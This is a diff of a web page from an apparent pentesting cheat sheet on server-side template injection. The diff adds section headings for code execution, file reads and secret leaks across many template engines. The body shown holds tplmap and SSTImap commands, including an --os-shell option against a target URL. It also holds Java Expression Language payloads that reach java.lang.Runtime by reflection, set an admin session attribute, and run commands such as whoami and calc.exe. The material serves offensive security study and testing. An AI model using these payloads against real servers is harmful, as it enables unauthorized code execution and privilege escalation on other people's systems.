@@ -9,8 +9,8 @@
 <meta property="og:description" content="All about server-side template injection techniques, methods, payloads, how/why/when they work." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.grayhatfreelancing.com/docs/server_side_template_injection/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-01-27T03:10:54-05:00" />
+<meta property="article:published_time" content="2023-06-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-22T12:15:46-04:00" />
 <title>Server-Side Template Injection | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
@@ -93,6 +93,58 @@ https://github.com/alex-shpak/hugo-book
 
   
   <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dom_clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="active">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
     
       
         <li>
@@ -1063,19 +1115,6 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/server_side_template_injection/" class="active">Server-Side Template Injection</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
     <a href="/docs/sql_injection/" class="">SQL Injection</a>
   
 
@@ -1090,19 +1129,6 @@ https://github.com/alex-shpak/hugo-book
 
   
     <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/type_juggling/" class="">Type Juggling</a>
   
 
         </li>
@@ -1433,19 +1459,6 @@ https://github.com/alex-shpak/hugo-book
         </li>
       
     
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
-  
-
-        </li>
-      
-    
   </ul>
 
 
@@ -1522,16 +1535,11 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
+    <li><a href="#server-side-template-injection">Server Side Template Injection</a>
       <ul>
-        <li><a href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware</a></li>
+        <li><a href="#summary">Summary</a></li>
         <li><a href="#tools">Tools</a></li>
         <li><a href="#methodology">Methodology</a></li>
-        <li><a href="#detection">Detection</a>
-          <ul>
-            <li><a href="#need-bugfix-for-this-polyglot">NEED BUGFIX FOR THIS POLYGLOT</a></li>
-          </ul>
-        </li>
         <li><a href="#aspnet-razor">ASP.NET Razor</a>
           <ul>
             <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
@@ -1540,7 +1548,7 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#expression-language-el">Expression Language EL</a>
           <ul>
-            <li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+            <li><a href="#expression-language-el---properties">Expression Language EL - Properties</a></li>
             <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
             <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
           </ul>
@@ -1564,31 +1572,44 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#handlebars">Handlebars</a>
           <ul>
-            <li><a href="#need-bugfix-for-handlebars">NEED BUGFIX FOR HANDLEBARS</a></li>
+            <li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
           </ul>
         </li>
         <li><a href="#jade--codepen">Jade / Codepen</a></li>
         <li><a href="#java">Java</a>
           <ul>
             <li><a href="#java---basic-injection">Java - Basic injection</a></li>
-            <li><a href="#need-bugfix-for-some-java">NEED BUGFIX FOR SOME JAVA</a></li>
             <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
             <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
           </ul>
         </li>
         <li><a href="#django-templates">Django Templates</a>
           <ul>
-            <li><a href="#need-bugfix-for-django">NEED BUGFIX FOR DJANGO</a></li>
+            <li><a href="#detection">Detection</a></li>
+            <li><a href="#django-templates-for-post-exploitation">Django Templates for post-exploitation</a></li>
+            <li><a href="#cross-site-scripting">Cross-site scripting</a></li>
+            <li><a href="#debug-information-leak">Debug information leak</a></li>
+            <li><a href="#leaking-apps-secret-key">Leaking app’s Secret Key</a></li>
+            <li><a href="#admin-site-url-leak">Admin Site URL leak</a></li>
+            <li><a href="#admin-username-and-password-hash-leak">Admin username and password hash leak</a></li>
           </ul>
         </li>
         <li><a href="#jinja2">Jinja2</a>
           <ul>
-            <li><a href="#need-bugfix-for-jinja2">NEED BUGFIX FOR JINJA2</a></li>
+            <li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
+            <li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
+            <li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
+            <li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
+            <li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
+            <li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
+            <li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a></li>
+            <li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
           </ul>
         </li>
         <li><a href="#jinjava">Jinjava</a>
           <ul>
-            <li><a href="#need-bugfix-for-jinjava">NEED BUGFIX FOR JINJAVA</a></li>
+            <li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
+            <li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
           </ul>
         </li>
         <li><a href="#lessjs">Lessjs</a>
@@ -1605,7 +1626,8 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#pebble">Pebble</a>
           <ul>
-            <li><a href="#need-bugfix-for-pebble">NEED BUGFIX FOR PEBBLE</a></li>
+            <li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
+            <li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
           </ul>
         </li>
         <li><a href="#ruby">Ruby</a>
@@ -1620,11 +1642,13 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#twig">Twig</a>
           <ul>
             <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
-            <li><a href="#need-bugfix-for-twig">NEED BUGFIX FOR TWIG</a></li>
             <li><a href="#twig---template-format">Twig - Template format</a></li>
+            <li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
+            <li><a href="#twig---code-execution">Twig - Code execution</a></li>
           </ul>
         </li>
-        <li><a href="#velocity">Velocity</a></li>
+        <li><a href="#java---velocity">Java - Velocity</a></li>
+        <li><a href="#java---spring">Java - Spring</a></li>
         <li><a href="#pattemplate">patTemplate</a></li>
         <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
         <li><a href="#plates">Plates</a></li>
@@ -1643,17 +1667,138 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="server-side-template-injections">
-  Server-Side Template Injections
-  <a class="anchor" href="#server-side-template-injections">#</a>
+  <article class="markdown"><h1 id="server-side-template-injection">
+  Server Side Template Injection
+  <a class="anchor" href="#server-side-template-injection">#</a>
 </h1>
-<h2 id="note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">
-  Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware
-  <a class="anchor" href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">#</a>
-</h2>
 <blockquote>
 <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
 </blockquote>
+<h2 id="summary">
+  Summary
+  <a class="anchor" href="#summary">#</a>
+</h2>
+<ul>
+<li><a href="#templates-injections">Templates Injections</a>
+<ul>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#aspnet-razor">ASP.NET Razor</a>
+<ul>
+<li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
+<li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
+</ul>
+</li>
+<li><a href="#expression-language-el">Expression Language EL</a>
+<ul>
+<li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+<li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
+<li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
+</ul>
+</li>
+<li><a href="#freemarker">Java - Freemarker</a>
+<ul>
+<li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
+<li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
+<li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
+<li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
+</ul>
+</li>
+<li><a href="#groovy">Groovy</a>
+<ul>
+<li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
+<li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
+<li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
+<li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
+<li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
+</ul>
+</li>
+<li><a href="#handlebars">JavaScript - Handlebars</a>
+<ul>
+<li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
+</ul>
+</li>
+<li><a href="#jade--codepen">Jade / Codepen</a></li>
+<li><a href="#java">Java</a>
+<ul>
+<li><a href="#java---basic-injection">Java - Basic injection</a></li>
+<li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
+<li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
+</ul>
+</li>
+<li><a href="#django-templates">Django Templates</a></li>
+<li><a href="#jinja2">Python - Jinja2</a>
+<ul>
+<li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
+<li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
+<li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
+<li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
+<li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
+<li><a href="#jinja2---read-remote-file">Jinja2 - Read remote file</a></li>
+<li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
+<li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a>
+<ul>
+<li><a href="#jinja2---forcing-output-on-blind-rce">Forcing output on blind RCE</a></li>
+<li><a href="#exploit-the-ssti-by-calling-ospopenread">Exploit the SSTI by calling os.popen().read()</a></li>
+<li><a href="#exploit-the-ssti-by-calling-subprocesspopen">Exploit the SSTI by calling subprocess.Popen</a></li>
+<li><a href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset">Exploit the SSTI by calling Popen without guessing the offset</a></li>
+<li><a href="#exploit-the-ssti-by-writing-an-evil-config-file">Exploit the SSTI by writing an evil config file.</a></li>
+</ul>
+</li>
+<li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
+</ul>
+</li>
+<li><a href="#jinjava">Java - Jinjava</a>
+<ul>
+<li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
+<li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
+</ul>
+</li>
+<li><a href="#lessjs">JavaScript - Lessjs</a>
+<ul>
+<li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
+<li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
+<li><a href="#plugins">Plugins</a></li>
+</ul>
+</li>
+<li><a href="#mako">Python - Mako</a>
+<ul>
+<li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
+</ul>
+</li>
+<li><a href="#pebble">Java - Pebble</a>
+<ul>
+<li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
+<li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#ruby">Ruby</a>
+<ul>
+<li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
+<li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
+<li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
+<li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#smarty">PHP - Smarty</a></li>
+<li><a href="#twig">PHP - Twig</a>
+<ul>
+<li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
+<li><a href="#twig---template-format">Twig - Template format</a></li>
+<li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
+<li><a href="#twig---code-execution">Twig - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#java---velocity">Java - Velocity</a></li>
+<li><a href="#java---spring">Java - Spring</a></li>
+<li><a href="#pattemplate">PHP - patTemplate</a></li>
+<li><a href="#phplib-and-html_template_phplib">PHP - PHPlib</a></li>
+<li><a href="#plates">PHP - Plates</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</li>
+</ul>
 <h2 id="tools">
   Tools
   <a class="anchor" href="#tools">#</a>
@@ -1661,29 +1806,20 @@ https://github.com/alex-shpak/hugo-book
 <p>Recommended tools:</p>
 <p><a href="https://github.com/epinna/tplmap">Tplmap</a> - Server-Side Template Injection and Code Injection Detection and Exploitation Tool</p>
 <p>e.g:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> --os-shell
-</span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&#34;</span>
-</span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&#34;</span> --level <span style="color:#ae81ff">5</span> -e jade
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> <span style="color:#f92672">--</span>os<span style="color:#f92672">-</span>shell
+</span></span><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&#34;</span>
+</span></span><span style="display:flex;"><span>python2<span style="color:#ae81ff">.7</span> <span style="color:#f92672">./</span>tplmap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&#34;</span> <span style="color:#f92672">--</span>level <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>e jade
 </span></span></code></pre></div><p><a href="https://github.com/vladko312/SSTImap">SSTImap</a> - Automatic SSTI detection tool with interactive interface based on <a href="https://github.com/epinna/tplmap">Tplmap</a></p>
 <p>e.g:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> -s
-</span></span><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=Vulnerable*&amp;message=My_message&#39;</span> -l <span style="color:#ae81ff">5</span> -e jade
-</span></span><span style="display:flex;"><span>python3 ./sstimap.py -i -A -m POST -l <span style="color:#ae81ff">5</span> -H <span style="color:#e6db74">&#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> <span style="color:#f92672">-</span>s
+</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;https://example.com/page?name=Vulnerable*&amp;message=My_message&#39;</span> <span style="color:#f92672">-</span>l <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>e jade
+</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">./</span>sstimap<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>i <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>m POST <span style="color:#f92672">-</span>l <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span>H <span style="color:#e6db74">&#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk&#39;</span>
 </span></span></code></pre></div><h2 id="methodology">
   Methodology
   <a class="anchor" href="#methodology">#</a>
 </h2>
 <p><img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true" alt="SSTI cheatsheet workflow" /></p>
 <hr>
-<h2 id="detection">
-  Detection
-  <a class="anchor" href="#detection">#</a>
-</h2>
-<p>In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :</p>
-<h3 id="need-bugfix-for-this-polyglot">
-  NEED BUGFIX FOR THIS POLYGLOT
-  <a class="anchor" href="#need-bugfix-for-this-polyglot">#</a>
-</h3>
 <h2 id="aspnet-razor">
   ASP.NET Razor
   <a class="anchor" href="#aspnet-razor">#</a>
@@ -1713,12 +1849,16 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0</p>
 </blockquote>
-<h3 id="expression-language-el---basic-injection">
-  Expression Language EL - Basic injection
-  <a class="anchor" href="#expression-language-el---basic-injection">#</a>
+<h3 id="expression-language-el---properties">
+  Expression Language EL - Properties
+  <a class="anchor" href="#expression-language-el---properties">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">}</span>
+<ul>
+<li>Interesting properties to access <code>String</code>, <code>java.lang.Runtime</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>${<span style="color:#ae81ff">2</span>.class}
+</span></span><span style="display:flex;"><span>${<span style="color:#ae81ff">2</span>.class.forName(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>)}
+</span></span><span style="display:flex;"><span>${<span style="color:#e6db74">&#39;&#39;</span>.getClass().forName(<span style="color:#e6db74">&#39;java.lang.Runtime&#39;</span>).getMethods()[<span style="color:#ae81ff">6</span>].toString()}
 </span></span></code></pre></div><h3 id="expression-language-el---one-liner-injections-not-including-code-execution">
   Expression Language EL - One-Liner injections not including code execution
   <a class="anchor" href="#expression-language-el---one-liner-injections-not-including-code-execution">#</a>
@@ -1728,6 +1868,9 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// JVM System Property Lookup (ex: java.class.path)
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.System&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getProperty&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;java.class.path&#34;</span><span style="color:#f92672">)}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Modify session attributes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>pageContext<span style="color:#f92672">.</span><span style="color:#a6e22e">request</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSession</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)}</span>
 </span></span></code></pre></div><h3 id="expression-language-el---code-execution">
   Expression Language EL - Code Execution
   <a class="anchor" href="#expression-language-el---code-execution">#</a>
@@ -1736,10 +1879,6 @@ https://github.com/alex-shpak/hugo-book
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>getRuntime<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(&lt;</span>COMMAND STRING<span style="color:#f92672">/</span>ARRAY<span style="color:#f92672">&gt;)</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ProcessBuilder</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(&lt;</span>COMMAND ARRAY<span style="color:#f92672">/</span>LIST<span style="color:#f92672">&gt;).</span><span style="color:#a6e22e">start</span><span style="color:#f92672">()</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using Runtime
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">])}</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)}</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#f92672">{</span>session<span style="color:#f92672">.</span><span style="color:#a6e22e">getAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rtc&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -c whoami&#34;</span><span style="color:#f92672">)}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using process builder
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">setAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.ArrayList&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">())}</span>
@@ -1751,9 +1890,13 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using Reflection &amp; Invoke
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">].</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;calc.exe&#34;</span><span style="color:#f92672">)}</span>
